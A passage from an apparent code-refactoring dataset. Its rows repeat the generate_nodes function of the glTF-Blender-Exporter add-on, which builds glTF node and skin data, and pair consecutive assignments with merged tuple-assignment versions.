translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)","node['name'] , translation  = 'Duplication_Offset_' + blender_object.name, convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","joints_written = True
skin = {}","joints_written , skin  = True, {}"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","skin['skeleton'] = get_node_index(glTF, blender_object.name)
skin['joints'] = joints
count = len(inverse_matrices) // 16","skin['skeleton'] , skin['joints'] , count  = get_node_index(glTF, blender_object.name), joints, len(inverse_matrices) // 16"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","type = 'MAT4'
inverseBindMatrices = create_accessor(operator, context, export_settings, glTF, inverse_matrices, GLTF_COMPONENT_TYPE_FLOAT, count, GLTF_DATA_TYPE_MAT4, '')","type , inverseBindMatrices  = 'MAT4', create_accessor(operator, context, export_settings, glTF, inverse_matrices, GLTF_COMPONENT_TYPE_FLOAT, count, GLTF_DATA_TYPE_MAT4, '')"
glTF-Blender-Exporter,https://github.com/KhronosGroup/glTF-Blender-Exporter/tree/master/scripts/addons/io_scene_gltf2/gltf2_generate.py,,generate_nodes$1720,"def generate_nodes(operator,
                   context,
                   export_settings,
                   glTF):
    """"""
    Generates the top level nodes entry.
    """"""

    nodes = []

    skins = []

    #
    #

    filtered_objects = export_settings['filtered_objects']

    for blender_object in filtered_objects:
        node = generate_node_instance(context, export_settings, glTF, nodes, blender_object, False)

        #
        #

        nodes.append(node)

    #
    #

    for blender_object in filtered_objects:
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group != None:

            if export_settings['gltf_layers'] or (blender_object.layers[0] and blender_object.dupli_group.layers[0]):

                for blender_dupli_object in blender_object.dupli_group.objects:
                    node = generate_node_instance(context, export_settings, glTF, nodes, blender_dupli_object,
                                                  True)

                    node['name'] = 'Duplication_' + blender_object.name + '_' + blender_dupli_object.name

                    #
                    #

                    nodes.append(node)

                #

                node = {}

                node['name'] = 'Duplication_Offset_' + blender_object.name

                translation = convert_swizzle_location(blender_object.dupli_group.dupli_offset, export_settings)

                node['translation'] = [-translation[0], -translation[1], -translation[2]]

                nodes.append(node)

    #
    #

    if len(nodes) > 0:
        glTF['nodes'] = nodes

    #
    #

    if export_settings['gltf_skins']:
        for blender_object in filtered_objects:
            if blender_object.type != 'ARMATURE' or len(blender_object.pose.bones) == 0:
                continue

            temp_action = None

            if export_settings['gltf_bake_skins'] and not export_settings['gltf_animations']:
                if blender_object.animation_data is not None:
                    temp_action = blender_object.animation_data.action

                bpy.context.scene.objects.active = blender_object
                bpy.ops.object.mode_set(mode='POSE')
                bpy.ops.nla.bake(frame_start=bpy.context.scene.frame_current, frame_end=bpy.context.scene.frame_current,
                                 only_selected=False, visual_keying=True, clear_constraints=False,
                                 use_current_action=False, bake_types={'POSE'})

            joints = []

            joints_written = False

            #

            children_list = list(blender_object.children)

            for blender_check_object in filtered_objects:
                blender_check_armature = blender_check_object.find_armature()

                if blender_check_armature == blender_object and blender_check_object not in children_list:
                    children_list.append(blender_check_object)

            #

            for blender_object_child in children_list:
                #
                # Property: skin and node
                #

                inverse_matrices = []

                for blender_bone in blender_object.pose.bones:

                    if export_settings['gltf_yup']:
                        axis_basis_change = mathutils.Matrix(
                            ((1.0, 0.0, 0.0, 0.0), (0.0, 0.0, 1.0, 0.0), (0.0, -1.0, 0.0, 0.0), (0.0, 0.0, 0.0, 1.0)))
                    else:
                        axis_basis_change = mathutils.Matrix.Identity(4)

                    if not joints_written:
                        node = {}

                        if blender_bone.parent is None:
                            correction_matrix_local = axis_basis_change * blender_bone.bone.matrix_local
                        else:
                            correction_matrix_local = blender_bone.parent.bone.matrix_local.inverted() * blender_bone.bone.matrix_local

                        matrix_basis = blender_bone.matrix_basis

                        if export_settings['gltf_bake_skins']:
                            matrix_basis = blender_object.convert_space(blender_bone, blender_bone.matrix,
                                                                        from_space='POSE', to_space='LOCAL')

                        generate_node_parameter(export_settings, correction_matrix_local * matrix_basis, node, 'JOINT')

                        #

                        node['name'] = blender_object.name + ""_"" + blender_bone.name

                        #
                        #

                        joints.append(len(nodes))

                        nodes.append(node)

                    #
                    #

                    inverse_bind_matrix = axis_basis_change * blender_bone.bone.matrix_local

                    bind_shape_matrix = axis_basis_change * blender_object.matrix_world.inverted() * blender_object_child.matrix_world * axis_basis_change.inverted()

                    inverse_bind_matrix = inverse_bind_matrix.inverted() * bind_shape_matrix

                    for column in range(0, 4):
                        for row in range(0, 4):
                            inverse_matrices.append(inverse_bind_matrix[row][column])

                #

                joints_written = True

                #

                skin = {}

                skin['skeleton'] = get_node_index(glTF, blender_object.name)

                skin['joints'] = joints

                #
                count = len(inverse_matrices) // 16
                type = ""MAT4""

                inverseBindMatrices = create_accessor(
                    operator,
                    context,
                    export_settings,
                    glTF,
                    inverse_matrices,
                    GLTF_COMPONENT_TYPE_FLOAT,
                    count,
                    GLTF_DATA_TYPE_MAT4,
                    """"
                )

                skin['inverseBindMatrices'] = inverseBindMatrices

                #

                skins.append(skin)

            #

            if temp_action is not None:
                blender_object.animation_data.action = temp_action

    #
    #

    if len(skins) > 0:
        glTF['skins'] = skins

    #
    # Resolve children etc.
    #

    for blender_object in filtered_objects:
        node_index = get_node_index(glTF, blender_object.name)

        node = nodes[node_index]

        #

        if export_settings['gltf_skins']:
            blender_armature = blender_object.find_armature()
            if blender_armature is not None:

                if blender_object in blender_armature.children:
                    index_offset = blender_armature.children.index(blender_object)
                else:
                    index_local_offset = 0

                    for blender_check_object in filtered_objects:
                        blender_check_armature = blender_check_object.find_armature()
                        if blender_check_armature == blender_armature:
                            index_local_offset += 1

                        if blender_object == blender_check_object:
                            index_local_offset -= 1
                            break

                    index_offset = len(blender_armature.children) + index_local_offset

                node['skin'] = get_skin_index(glTF, blender_armature.name, index_offset)

        #

        children = []

        # Camera
        if export_settings['gltf_cameras']:
            if blender_object.type == 'CAMERA':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Light
        if export_settings['gltf_lights']:
            if blender_object.type == 'LAMP':
                child_index = get_node_index(glTF, 'Correction_' + blender_object.name)
                if child_index >= 0:
                    children.append(child_index)

        # Nodes
        for blender_child_node in blender_object.children:
            child_index = get_node_index(glTF, blender_child_node.name)

            if blender_child_node.parent_type == 'BONE' and export_settings['gltf_skins']:
                continue

            if child_index < 0:
                continue

            children.append(child_index)

        # Duplications
        if blender_object.dupli_type == 'GROUP' and blender_object.dupli_group is not None:

            child_index = get_node_index(glTF, 'Duplication_Offset_' + blender_object.name)
            if child_index >= 0:
                children.append(child_index)

                duplication_node = nodes[child_index]

                duplication_children = []

                for blender_dupli_object in blender_object.dupli_group.objects:
                    child_index = get_node_index(
                        glTF,
                        'Duplication_' + blender_object.name + '_' + blender_dupli_object.name
                    )
                    if child_index >= 0:
                        duplication_children.append(child_index)

                duplication_node['children'] = duplication_children

                #

        if export_settings['gltf_skins']:
            # Joint
            if blender_object.type == 'ARMATURE' and len(blender_object.pose.bones) > 0:

                #

                blender_object_to_bone = {}

                if export_settings['gltf_skins']:
                    for blender_child_node in blender_object.children:
                        if blender_child_node.parent_type == 'BONE':
                            blender_object_to_bone[blender_child_node.name] = blender_child_node.parent_bone

                #

                for blender_bone in blender_object.pose.bones:

                    if blender_bone.parent:
                        continue

                    child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                    if child_index < 0:
                        continue

                    children.append(child_index)

                for blender_bone in blender_object.pose.bones:
                    joint_children = []
                    for blender_bone_child in blender_bone.children:
                        child_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone_child.name)

                        if child_index < 0:
                            continue

                        joint_children.append(child_index)

                    for blender_object_name in blender_object_to_bone:
                        blender_bone_name = blender_object_to_bone[blender_object_name]
                        if blender_bone_name == blender_bone.name:
                            child_index = get_node_index(glTF, blender_object_name)

                            if child_index < 0:
                                continue

                            joint_children.append(child_index)

                    if len(joint_children) > 0:
                        node_index = get_node_index(glTF, blender_object.name + ""_"" + blender_bone.name)

                        child_node = nodes[node_index]

                        child_node['children'] = joint_children

        if len(children) > 0:
            node['children'] = children","duplication_node = nodes[child_index]
duplication_children = []","duplication_node , duplication_children  = nodes[child_index], []"
djongo,https://github.com/nesdis/djongo/tree/master/tests/django_tests/tests/v22/tests/gis_tests/geo3d/tests.py,Geo3DFunctionsTests,test_geojson$221,"def test_geojson(self):
